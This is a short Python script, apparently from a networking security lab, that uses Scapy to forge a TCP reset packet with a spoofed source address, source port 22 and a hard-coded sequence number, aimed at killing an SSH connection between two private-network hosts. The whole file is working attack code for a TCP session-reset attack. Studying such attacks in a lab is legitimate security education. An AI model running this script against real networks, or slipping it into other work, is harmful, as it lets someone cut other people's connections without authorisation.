#!/usr/bin/python3
import sys
from scapy.all import *

num = 4072046586

print("SENDING RESET PACKET.........")
IPLayer = IP(src="10.0.2.5", dst="10.0.2.4")
TCPLayer = TCP(sport=22, dport=54546, flags="R", seq=num)
pkt = IPLayer/TCPLayer
#ls(pkt)
send(pkt, verbose=0)
